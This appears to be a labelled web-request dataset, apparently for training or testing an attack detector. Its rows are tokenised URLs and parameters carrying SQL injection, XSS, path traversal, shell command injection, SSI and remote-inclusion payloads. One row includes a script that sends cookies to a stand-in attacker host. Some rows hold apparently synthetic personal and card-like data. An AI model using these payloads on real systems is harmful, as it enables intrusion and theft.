sentences 	 labels
/ string / strings / parameters = < script > document . cookie =  " testgfjr = 1286 ;  "  <  / script >  \r\n\r\n 	 0
/ string / strings / parameters = \  \  "  ; alert (  ' xss '  )  ;  /  /  \r\n\r\n 	 0
/ fcgi-bin / ppdscgi . exe  \r\n\r\n 	 0
/ phpmyadmin / export . php ? what =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  \r\n\r\n 	 0
/ string / strings / parameters = "  >  < script / src = data :  , alert ( 1 )  & sol ;  & sol ;  \r\n\r\n 	 0
/ examples / jsp / cal / index . php ? album =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  \r\n\r\n 	 0
/ string / strings / parameters = "  &  sleep 0  &  &  str =  $  ( echo frmtbn )   &  &  str1 =  $  {  # str }   &  &   [  6 -eq  $  { str1 }   ]   &  &  sleep 1  '  \r\n\r\n 	 0
/ en-us / s7qus4g3 . pl ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  where 2332 = 2332 or 9643 =  ( select count (  *  )  from domain . domains as t1 , domain . columns as t2 , domain . tables as t3 )  --  \r\n\r\n 	 0
/ string / id = 2 & nombre = queso + manchego & precio = 100 & cantidad = 29 & b1 = aadir + al + carrito +  \r\n\r\n 	 0
/ javascript / business . exe  \r\n\r\n 	 0
/ en-us / account / directorypro . cgi ? want = showcat & show =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  \r\n\r\n 	 0
/ string / strings / parameters = < img src \ x32 = x onerror =  " javascript : alert ( 1 )  "  >  \r\n\r\n 	 0
/ string / strings / parameters = -6733 '  )  where 4024 = 4024 union all select 4024 , 4024 , 4024 , 4024 #  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  )  )  )  and 3754 =  ( select upper ( xmltype ( chr ( 60 )  |  | chr ( 58 )  |  | chr ( 113 )  |  | chr ( 113 )  |  | chr ( 112 )  |  | chr ( 106 )  |  | chr ( 113 )  |  |  ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual )  |  | chr ( 113 )  |  | chr ( 122 )  |  | chr ( 118 )  |  | chr ( 122 )  |  | chr ( 113 )  |  | chr ( 62 )  )  )  from dual )  and  (  (  (  "  " wwaq "  "  =  "  " wwaq  \r\n\r\n 	 0
/ string / strings / parameters = '   str =  $  ( echo giprgx )   str1 =  $  {  # str }   if  [  6 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  &  \r\n\r\n 	 0
/ string / strings / parameters = -1051 "  "  )  where 6586 = 6586 or 6647 = 6738 #  \r\n\r\n 	 0
/ string / id = 2 & nombre = queso + manchego & precio = 85 /  & cantidad = 67 & b1 = aadir + al + carrito  \r\n\r\n 	 0
/ string / modo = entrar & login = kolahi45 & pwd = 69 ' c48ng , 7 , 7a & remember = on & b1 = entrar  \r\n\r\n 	 0
/ examples / jsp / checkbox / cal_week . php ? op = week & catview = 999 '  \r\n\r\n 	 0
/ string / strings / parameters = 1 %  "  "  )  )  or 4411 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  and  (  (  "  "  %  "  "  =  "  "  \r\n\r\n 	 0
/ javascript / partners . exe  \r\n\r\n 	 0
/ javascript / phpeventcalendar . exe  \r\n\r\n 	 0
/ zln2hm2z . do ?  < script > document . cookie =  " testblcp = 8120 ;  "  <  / script >  \r\n\r\n 	 0
/ examples / jsp / cal / forumdisplay . php ? fid = 21 "  >  < script > x <  / script >  \r\n\r\n 	 0
/ string / str =  $  ( echo spzwvr )   str1 =  $  {  # str }   if  [  8 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  &  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  )  where 2570 = 2570 and 3707 =  ( select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 )  --  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  )  where 8462 = 8462 and updatexml ( 3393 , concat ( 0x2e , 0x7171706a71 ,  ( select  ( elt ( 3393 = 3393 , 1 )  )  )  , 0x717a767a71 )  , 1161 )  --  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  and  ( select 2 *  ( if (  ( select  *  from  ( select concat ( 0x7171706a71 ,  ( select  ( elt ( 3484 = 3484 , 1 )  )  )  , 0x717a767a71 , 0x78 )  ) s )  ,  8446744073709551610 ,  8446744073709551610 )  )  )  and  ' wjwn '  =  ' wjwn  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  ,  ( select  ( case when  ( 2073 = 5314 )  then 1 else 1 /  ( select 0 )  end )  )  \r\n\r\n 	 0
/ vac1l5vm . cfc ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ string / strings / parameters = |   [  2 -ne  $  ( echo fyxpmz  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  '  \r\n\r\n 	 0
/ en-us / 7o5qp766 . dll ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ help . php ? q =  "  & ver \ x0b > q16289629 & rem \ x0b  \r\n\r\n 	 0
/ odzk29aa . do ?  < script > document . cookie =  " testtfvh = 2141 ;  "  <  / script >  \r\n\r\n 	 0
/ mkportal / include / user . php ? mk_path = xxpathxx ?  \r\n\r\n 	 0
/ string / strings / parameters = 1 )  )  and 4241 = convert ( int ,  ( select char ( 113 )  + char ( 113 )  + char ( 112 )  + char ( 106 )  + char ( 113 )  +  ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end )  )  + char ( 113 )  + char ( 122 )  + char ( 118 )  + char ( 122 )  + char ( 113 )  )  )  and  (  ( 9313 = 9313  \r\n\r\n 	 0
/ string / modoa = registro & login = gaconnie & password = 81v58o & nombre = dimas & apellidos = iigo + abelli & email = carbonell @ adondeir . um & dni = 83627503d & direccion = calle + gran + plaza ,  + 103 ,  + 13 ? h & ciudad = san + carlos + del + valle & cp = 15211 & provincia = guipzcoa & ntc = 5505928898200135 & b1 = registrar  \r\n\r\n 	 0
/ string / strings / parameters = 1 )  )  as xbii where 2262 = 2262 or sleep ( 5 )  --  \r\n\r\n 	 0
/ examples / jsp / colors / www / delivery / ac . php ? bannerid = -1331904367 + or + 1 = 1 +  --  +  '  ; passthru ( base64_decode (  $ _server [ http_nessus__zozllvj ]  )  )  ; die ;  /  *  \r\n\r\n 	 0
/ string / modo = insertar & precio = 1517 & b1 = and + 1 = 1  \r\n\r\n 	 0
/ javascript / recharge . exe  \r\n\r\n 	 0
/ string / strings / parameters = < iframe >  < iframe src = javascript : confirm ( 4 )  >  <  / iframe >  \r\n\r\n 	 0
/ string / strings / parameters = '  | echo $ ifsqszpwd $  (  ( 73 + 91 )  )  $  ( echo $ ifsqszpwd ) qszpwd &  \r\n\r\n 	 0
/ string / strings / parameters = :  \r\n\r\n 	 0
/ ghswfouu . do ?  < meta http-equiv = set-cookie content =  " testsqmm = 5713 "  >  \r\n\r\n 	 0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo misrqq )   &  &  str1 =  $  {  # str }   &  &   [  6 -eq  $  { str1 }   ]   &  &  sleep 1  |  \r\n\r\n 	 0
/ string / strings / parameters = '  &  sleep 0  &  &  str =  $  ( echo jdgurs )   &  &  str1 =  $  {  # str }   &  &   [  2 -eq  $  { str1 }   ]   &  &  sleep 1  |  \r\n\r\n 	 0
/ string / modo = registro & login = scythia & password = 3389agi48 & nombrea = francesca & apellidos = bagaria & email = hsaio @ suecas . com . ec & dni = 15025159h & direccion = carrer + vallseca ,  + 42 ,  +  & ciudad = torrecilla + del + pinar & cp = 25225 & provincia = jan & ntc = 2462273534930751 & b1 = registrar  \r\n\r\n 	 0
/ examples / jsp / checkbox / quickstore . cgi ? nessus & template =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00html  \r\n\r\n 	 0
/ javascript / bulk . exe  \r\n\r\n 	 0
/ string / modo = registro & login = koay & password = e * mbermejecer & nombre = baroncio & apellidos = monjo + porto & email = ahna @ zampy . in & dnia = 26293513m & direccion = calle + ramon + de + campoamor ,  + 165 + 5 ? g & ciudad = vilamacolum & cp = 19245 & provincia = badajoz & ntc = 1165920681066048 & b1 = registrar  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  in boolean mode )  ; iif ( 5257 = 5257 , 1 , 1 / 0 )  \r\n\r\n 	 0
/ cgi-bin / starnet / addons / slideshow_full . php ? album_name =  ' 123258797  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  +  ( select iutk where 6158 = 6158 ; select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  +  '  \r\n\r\n 	 0
/ examples / jsp / colors / search . jsp ? q =  %  "  < script > alert ( 1331904373 )  <  / script >  \r\n\r\n 	 0
/ admin . loudmouth . php ? mainframe = xxpathxx  \r\n\r\n 	 0
/ en-us / 7o5qp766 . do ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ string / modo = registro & login = rosalyn & password = 0m84n750 & nombre = jeannette + amelie & apellidos = esguevillas + abizanda & email = janda @ sayuela . aw & dni = 04452062k & direccion = calle + carassa + 117 ,  +  & ciudad = galinduste & cp = 16268 & provincia = a + corua & ntc = 8900090922020406 & b1 = registrarsessionid = 12312312 &  + username =  < script > document . location =  ' http :  /  / hacker +  . example . com / cgi-bin / cookiesteal . cgi ?  '  +  + document . cookie <  / script >  \r\n\r\n 	 0
/ javascript / websvn . exe  \r\n\r\n 	 0
/ string / strings / parameters = -4639 "  "  )  )  )  or 8550 = 9348  \r\n\r\n 	 0
/ string / modo = entrar & login = ovas <  !  --  # include + file =  " archivo_secreto "  +  --  >  & pwd = ric8me6te & remember = on & b1 = entrar  \r\n\r\n 	 0
/ top . php ? stuff =  "  & ping , -w , 11000 , -n , 1 , 1 . 2 . 3 . 4 & rem ,  \r\n\r\n 	 0
/ string / strings / parameters = -2009 %  '  union all select 1991 , 1991 #  \r\n\r\n 	 0
/ help . php ? q =  "  & ver \ xa0 > q93363383 & rem \ xa0  \r\n\r\n 	 0
/ string / strings / parameters = "  ;  str =  $  ( echo vqeapq )  ;  str1 =  $  {  # str }  ;  if  [  9 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  '  \r\n\r\n 	 0
/ string / strings / parameters = ;  str =  $  ( echo hnlfqm )  ;  str1 =  $  {  # str }  ;  if  [  3 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  &  \r\n\r\n 	 0
/ string / modo = insertar & precio = 88 & b1 = confirmar <  !  --  # exec + cmd =  " ls +  /  "  --  >  \r\n\r\n 	 0
/ ad_click . asp ? banner_id =  '  \r\n\r\n 	 0
/ t578vqea . fts ?  < meta http-equiv = set-cookie content =  " testsory = 7676 "  >  \r\n\r\n 	 0
/ string / strings / parameters = < form action =  ' data : text & sol ; html ,  & lt ; script & gt ; confirm ( 1 )  & lt / script & gt '  >  < button > click  \r\n\r\n 	 0
/ edzaia0i . jspa ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ string / modo = registro & login = grueng & password = ma * guillo & nombre = nelio & apellidos = febo + derch & email = hollen_farber @ bacoespecialseleccin . bu & dnia = 71766334d & direccion = calle + ruiseor + 34 +  & ciudad = moreda + de + lava & cp = 10374 & provincia = segovia & ntc = 2753265172656734 & b1 = registrar  \r\n\r\n 	 0
/ string / strings / parameters = print  @  @ variable  \r\n\r\n 	 0
/ string / errormsg = any ?  set-cookie :  + tamper = 5765205567234876235  \r\n\r\n 	 0
/ string / strings / parameters = 1 < set / xmlns =  ` urn : schemas-microsoft-com : time `  style =  ` beh &  # x41vior : url (  # default # time2 )  `  attributename =  ` innerhtml `  to =  `  & lt ; img / src =  & quot ; x & quot ; onerror = javascript : alert ( 1 )  & gt ;  `  >  \r\n\r\n 	 0
/ string / strings / parameters = ; echo sxgzim $  (  ( 69 + 52 )  )  $  ( echo sxgzim ) sxgzim "  \r\n\r\n 	 0
/ top . php ? stuff =  '  \ x0drm q83658658  #  \r\n\r\n 	 0
/ string / strings / parameters = "  >  <  < x > script > confirm ( 2 )  <  < x >  /  < x > script >  \r\n\r\n 	 0
/ top . php ? stuff =  & ver ;  > q25243259 & rem ;  \r\n\r\n 	 0
/ scripts / starnet / addons / slideshow_full . php ? album_name =  ' 1271410576  \r\n\r\n 	 0
/ string / modo = registro & login = thac & password = crin + ada & nombre = aliberta & apellidos = gochez & email = kubler5 @ porqueagel . ps & dni = 49372725m & direccion = calle + barrio + de + la + torre + 163 ,  +  & ciudad = alar + del + rey & cp = 22770 & provincia =  / c * cere * s & ntc = 5546440906293369 & b1 = registrar  \r\n\r\n 	 0
/ recordings / al_initialize . php ? alpath =  / etc / passwd \ x00  \r\n\r\n 	 0
/ s7qus4g3 . cfm ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ string / strings / parameters = '   str =  $  ( echo zsgsgj )   str1 =  $  {  # str }   if  [  1 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  /  /  \r\n\r\n 	 0
/ string / strings / parameters = & lt ; input type =  \  " image \  "  src =  \  " javascript &  # 058 ; alert (  ' xss '  )  ;  \  "  & gt ;  \r\n\r\n 	 0
/ string / strings / parameters = 1 )  )  ; if ( 2643 = 1393 )  select 2643 else drop function nqss --  \r\n\r\n 	 0
/  ?  < meta http-equiv = set-cookie content =  " testiklc = 904 "  >  \r\n\r\n 	 0
/ miz4r5hz . htm ?  < meta http-equiv = set-cookie content =  " testviqu = 1270 "  >  \r\n\r\n 	 0
/ main . php ? logout =  ' uname \ x09 > q59958199 \ x09 #  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  )  or 8421 =  ( select count (  *  )  from generate_series ( 1 , 5000000 )  )  and  (  ' csmu '  =  ' csmu  \r\n\r\n 	 0
/ javascript / d . exe  \r\n\r\n 	 0
/ javascript / velocity . exe  \r\n\r\n 	 0
/ examples / jsp / checkbox / phf ? qalias = x \ x0a / bin / cat  / etc / passwd  \r\n\r\n 	 0
/ i7prbs22 . idc ?  < meta http-equiv = set-cookie content =  " testjnre = 7328 "  >  \r\n\r\n 	 0
/ string / str =  $  ( echo ikkweg )   str1 =  $  {  # str }   if  [  4 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  #  \r\n\r\n 	 0
/ string / str =  $  ( echo huzgzz )   str1 =  $  {  # str }   if  [  5 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  /  /  \r\n\r\n 	 0
/ top . php ? stuff = ver \ x0c > q95318168 & rem \ x0c  \r\n\r\n 	 0
/ string / strings / parameters = abc < div style =  " x :  \ x00expression ( javascript : alert ( 1 )  "  > def  \r\n\r\n 	 0
/ string / str =  $  ( echo xelppn )   str1 =  $  {  # str }   if  [  4 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  "  \r\n\r\n 	 0
/ examples / jsp / error / resetpw . php ? email =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  \r\n\r\n 	 0
/ string / strings / parameters = ;  str =  $  ( echo oqsiql )  ;  str1 =  $  {  # str }  ;  if  [  5 -ne  $  { str1 }   ]  ;  then sleep 0 ;  else sleep 1 ;  fi  '  \r\n\r\n 	 0
/ string / modo = registro & login = boyajian & password = serviola & nombre = rut & apellidos = ximnez + alamo & email = gleaves4 @ mauroman . ml & dni = 93721450s & direccion = escritor + gomez + de + rivera ,  + 191 +  & ciudad = legutiano & cp = 09119 & provincia = cceres & ntc = 9325877908605374 & b1 = registrar <  !  --  # include + file =  " archivo_secreto "  +  --  >  \r\n\r\n 	 0
/ string / strings / parameters = )  waitfor delay  ' 0 : 0 : 20 '   /  *  \r\n\r\n 	 0
/ en-us / account / apa_phpinclude . inc . php ? apa_module_basedir =  / etc / passwd \ x00  \r\n\r\n 	 0
/ manager ? username =  "  < script > foo <  / script  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  or row ( 1045 , 7562 )  >  ( select count (  *  )  , concat ( 0x7171706a71 ,  ( select  ( elt ( 1045 = 1045 , 1 )  )  )  , 0x717a767a71 , floor ( rand ( 0 )  * 2 )  ) x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x )  and  "  " cgpm "  "  like  "  " cgpm  \r\n\r\n 	 0
/ string / strings / parameters = '   str =  $  ( echo gbqynr )   str1 =  $  {  # str }   if  [  5 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  |  \r\n\r\n 	 0
/ string / strings / parameters = < rect  fill =  " white "  style =  " clip-path : url ( test3 . svg # a )  ; fill : url (  # b )  ; filter : url (  # c )  ; marker : url (  # d )  ; mask : url (  # e )  ; stroke : url (  # f )  ;  "  /  >  \r\n\r\n 	 0
/ string / strings / parameters = &  sleep 0  &  &  str =  $  ( echo ehnnqt )   &  &  str1 =  $  {  # str }   &  &   [  6 -eq  $  { str1 }   ]   &  &  sleep 1  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  )  )  )  and 5556 =  ( select count (  *  )  from all_users t1 , all_users t2 , all_users t3 , all_users t4 , all_users t5 )  and  (  (  (  "  " ecoa "  "  like  "  " ecoa  \r\n\r\n 	 0
/ string / b2 =  +  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  )  where 4092 = 4092 or char ( 75 )  |  | char ( 70 )  |  | char ( 99 )  |  | char ( 83 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  --  \r\n\r\n 	 0
/ interface / billing / billing_process . php ? srcdir = xxpathxx ?  \r\n\r\n 	 0
/ string / strings / parameters = 1 %  "  "  )  ; select count (  *  )  from sysibm . systables as t1 , sysibm . systables as t2 , sysibm . systables as t3 --  \r\n\r\n 	 0
/ src / scripture . php ? pageheaderfile = http :  /  / 192 . 168 . 202 . 118 : 8080 / tzhfyzkbomspvm ?  ?  \r\n\r\n 	 0
/ manager / index . php ? id =  ' union /  *  *  / select /  *  *  / 0 , 0 , 1318083641 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 --  \r\n\r\n 	 0
/ dff_php_frameworkapi-latest / include / dff_rss . func . php ? dff_config [ dir_include ]  = xxpathxx  \r\n\r\n 	 0
/ string / id = 2 & nombre = vino + rioja & precio = 39 & cantidad =  '  ; waitfor + delay +  ' 0 : 0 : 15 '  ;  --  & b1 = aadir + al + carrito  \r\n\r\n 	 0
/ examples / servlets / servlet / gotopage . cgi ? 4242 +  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd  \r\n\r\n 	 0
/ string / strings / parameters = '  echo bmhvjk $  (  ( 19 + 30 )  )  $  ( echo bmhvjk ) bmhvjk \  \r\n\r\n 	 0
/ scripts /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  / windows / win . ini  \r\n\r\n 	 0
/ string / strings / parameters = <  !  --  # echo var =  " http_user_agent "   --  >  \r\n\r\n 	 0
/ hjdzm96v . exe ?  < meta http-equiv = set-cookie content =  " testbyqe = 7474 "  >  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  )  )  and 3824 = benchmark ( 5000000 , md5 ( 0x76555642 )  )  and  (  (  ' inrm '  like  ' inrm  \r\n\r\n 	 0
/ driver ' s_education /  \r\n\r\n 	 0
/ scripts / search . pl ? form =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  \r\n\r\n 	 0
/ scripts / sysinfo . cgi ? action = systemdoc & name = sysinfo_name_cmd_exec . nasl ; id  \r\n\r\n 	 0
/ javascript /  . passwd . pem  \r\n\r\n 	 0
/ main . php ? logout =  "  \ x0drm \ x09q59885581 \ x09 #  \r\n\r\n 	 0
/ string / modo = entrar & login = lilllie8 & pwd = 4mpo599c7mientoset-cookie :  + tamper = 1041264011025374727 & remember = on & b1 = entrar  \r\n\r\n 	 0
/ classes / phpmailer / class . cs_phpmailer . php ? classes_dir = xxpathxx  \r\n\r\n 	 0
/ string / strings / parameters = < scri \ x00pt > confirm ( 1 )  ;  <  / scri \r\n\r\n 	 0
/ javascript / cv . exe  \r\n\r\n 	 0
/ en-us / account / alienform . cgi ? _browser_out =  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  /  .  |  .  / etc / passwd  \r\n\r\n 	 0
/ string / strings / parameters = < textarea id = xss onfocus = javascript : eval ( string [  ' fromcharcode '  ]  ( 97 , 108 , 101 , 114 , 116 , 40 , 39 , 120 , 115 , 115 , 39 , 41 , 32 )  )  autofocus >  \r\n\r\n 	 0
/ string / id = 2 & nombre =  '  + delete + from + users & precio = 39 & cantidad = 74 & b1 = aadir + al + carrito  \r\n\r\n 	 0
/ 7u1pb2xi . jspa ?  < script > document . cookie =  " testlwwz = 718 ;  "  <  / script >  \r\n\r\n 	 0
/ scripts / www / delivery / ac . php ? bannerid = -14 + or + 1 = 1  \r\n\r\n 	 0
/ string / strings / parameters = < img  \ x39src = x onerror =  " javascript : alert ( 1 )  "  >  \r\n\r\n 	 0
/ en-us /  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  . htm  \r\n\r\n 	 0
/ main . php ? logout =  ' uname  > q43392461  #  \r\n\r\n 	 0
/ fckeditor / editor / filemanager / browser / default / connectors / php / connector . php ? dirroot = xxpathxx  \r\n\r\n 	 0
/ i686v90l . jspa ?  < script > document . cookie =  " testfutf = 1550 ;  "  <  / script >  \r\n\r\n 	 0
/ string / strings / parameters = *  { background : url ( xx : x  /  /  *  *  /  \ red /  *  )  }   /  *  ie 6-7 standards mode  *  /  \r\n\r\n 	 0
/ string / strings / parameters = 1 )  )  )  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 )  |  | char ( 69 )  |  | char ( 83 )  , null )  , 0 )  , 500000000 )  , null )  else char ( 76 )  |  | char ( 65 )  |  | char ( 102 )  |  | char ( 72 )  end )  from  ( values ( 0 )  )  )  and  (  (  ( 3950 = 3950  \r\n\r\n 	 0
/ d7ktpmcq . exe ?  < img src =  " javascript : alert ( cross_site_scripting . nasl )  ;  "  >  \r\n\r\n 	 0
/ string / id = 2 & nombre = jamn + ibrico & precio = 100 /  & cantidad = 74 & b1 = aadir + al + carrito  \r\n\r\n 	 0
/ string / strings / parameters = < div style =  "  " binding :  url (  [ link to code ]  )  ;  "  "  >  \r\n\r\n 	 0
/ string / strings / parameters = ; echo fahqnn $  (  ( 39 + 84 )  )  $  ( echo fahqnn ) fahqnn &  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  )  )  and 6510 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  and  (  (  ' tqpj '  =  ' tqpj  \r\n\r\n 	 0
/ string / strings / parameters = echo $ ifsbxcebe $  (  ( 79 + 33 )  )  $  ( echo $ ifsbxcebe ) bxcebe "  \r\n\r\n 	 0
/ string / strings / parameters = -3819 '  )  )  )  union all select 9014 , 9014 , 9014 , 9014 , 9014 , 9014 --  \r\n\r\n 	 0
/ jackrabbit / search . jsp ? q =  %  "  < script > alert ( 1331904374 )  <  / script >  \r\n\r\n 	 0
/ webdav / phprun . php ? cmd = c :  \ wce . exe -r  \r\n\r\n 	 0
/ string / strings / parameters = -5748 '  union all select 1224 , 1224 , 1224 , 1224 , 1224 , 1224 , 1224 , 1224 , 1224 #  \r\n\r\n 	 0
/ gallery / captionator . php ? gallery_basedir = xxpathxx  \r\n\r\n 	 0
/ string / strings / parameters = < script > if (  " x \  \ xe0 \ xb9 \ x92 "  . length =  = 2 )   {  javascript : alert ( 1 )  ;  }  <  / script >  \r\n\r\n 	 0
/ string / str =  $  ( echo fnslec )   str1 =  $  {  # str }   if  [  4 -ne  $  { str1 }   ]   then sleep 0  else sleep 1  fi  |  \r\n\r\n 	 0
/ string / strings / parameters = -1876 %  '  )  union all select 6463 --  \r\n\r\n 	 0
/ main . php ? stuff =  " ping \ xa0-w \ xa07000 \ xa0-n \ xa01 \ xa01 . 2 . 3 . 4 & rem \ xa0  \r\n\r\n 	 0
/ cgi-bin / comersus_searchitem . asp "  >  < script > alert (  ' nessus was here '  )  ;  <  / script >  \r\n\r\n 	 0
/ q703m78q . kspx ?  < script > document . cookie =  " testvowq = 604 ;  "  <  / script >  \r\n\r\n 	 0
/ string / strings / parameters = 1 "  "  )  )  )  or 4411 =  ( select count (  *  )  from sysusers as sys1 , sysusers as sys2 , sysusers as sys3 , sysusers as sys4 , sysusers as sys5 , sysusers as sys6 , sysusers as sys7 )  and  (  (  (  "  " nrhz "  "  like  "  " nrhz  \r\n\r\n 	 0
/ javascript / hyper . exe  \r\n\r\n 	 0
/ bin / dcforum . cgi ? az = list & forum =  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  /  .  .  / etc / passwd \ x00  \r\n\r\n 	 0
/ string / modo = registro & login = hainline4 & password = m9a & nombre = dayan & apellidos = aldeta + marnetti & email = chanel_ismael @ conac . com . ie & dni = 98027307l & direccion = c /  + abeja ,  + s / n +  & ciudad = navalacruz & cp = 24740 & provinciaa = segovia & ntc = 1385468393912662 & b1 = registrar  \r\n\r\n 	 0
/ cgi-bin / fileseek . cgi ? head =  & foot =  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  /  .  .  .  .  /  / etc / passwd  \r\n\r\n 	 0
/ main . php ? logout =  "  \ x0auname  > q33271476  #  \r\n\r\n 	 0
/ string / strings / parameters = 1 )  where 6304 = 6304 ; select like (  ' abcdefg '  , upper ( hex ( randomblob ( 500000000 / 2 )  )  )  )  --  \r\n\r\n 	 0
/ main . php ? logout =  " ping \ xa0-w \ xa010000 \ xa0-n \ xa01 \ xa01 . 2 . 3 . 4 & rem \ xa0  \r\n\r\n 	 0
/ string / strings / parameters = 1 )  )  )  and  ( select  *  from  ( select ( sleep ( 5 )  )  ) fzno )  and  (  (  ( 1601 = 1601  \r\n\r\n 	 0
/ string / strings / parameters = '  |   [  6 -ne  $  ( echo jtxvkl  |  tr -d  '  \ n '   |  wc -c )   ]   |  |  sleep 1  \r\n\r\n 	 0
/ handlers / page / show . php ? sous_rep = xxpathxx  \r\n\r\n 	 0
/ string / strings / parameters = 1 '  )  ; create or replace function sleep ( int )  returns int as  '  / lib / libc . so . 6 '  ,  ' sleep '  language  ' c '  strict ;  select sleep ( 5 )  --  \r\n\r\n 	 0
/ template / purpletech / base_include . php ? page = xxpathxx ?  \r\n\r\n 	 0
/ m2fpztty . php ?  < script > cross_site_scripting . nasl <  / script >  \r\n\r\n 	 0
